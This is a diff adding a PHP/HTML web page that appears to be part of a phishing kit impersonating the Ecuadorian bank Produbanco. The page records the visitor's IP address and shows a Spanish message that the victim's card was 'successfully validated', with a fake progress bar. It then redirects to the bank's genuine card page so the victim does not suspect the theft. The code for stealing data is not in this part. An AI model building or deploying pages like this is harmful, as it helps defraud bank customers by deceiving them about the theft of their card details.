@@ -1,0 +1,67 @@
+<meta http-equiv="Refresh"
+content="4;url=https://www.produbanco.com.ec/banca-personas/tarjetas/"> 
+<?php
+@$userp = $_SERVER['REMOTE_ADDR'];
+
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="lapa/aparent.css">
+    <title>Internet - Home</title>
+  
+
+    <style>
+        .progress-container {
+            width: 80%;
+            margin: 50px auto;
+            border: 2px solid #757575;
+            border-radius: 5px;
+            padding: 5px;
+        }
+
+        .progress-bar {
+            width: 0;
+            height: 30px;
+            background-color: #00aa08;
+            color: #fff;
+            text-align: center;
+            line-height: 30px;
+            border-radius: 5px;
+        }</style>
+
+
+</head>
+<body>
+    <h2></h2>
+    <center>
+        <form method="post" action="#" onsubmit="return sender();">
+        <img style="width: 30%;  " src="new/lim.jpg" alt=""> <div class="clear"></div> 
+        <h2>Felicidades, Tu Tarjeta ha sido Procesada exitosamente validada</h2>
+   
+  <div class="progress-container">
+    <div class="progress-bar" id="progress-bar">0%</div>
+</div>
+
+
+<script>
+    function startProgressBar() {
+        var progressBar = document.getElementById("progress-bar");
+        var progress = 10;
+
+        var interval = setInterval(function () {
+            if (progress < 100) {
+                progress++;
+                progressBar.style.width = progress + "%";
+                progressBar.textContent = progress + "%";
+            } else {
+                clearInterval(interval);
+            }
+        }, 30);
+    }
+
+    startProgressBar();
+</script>
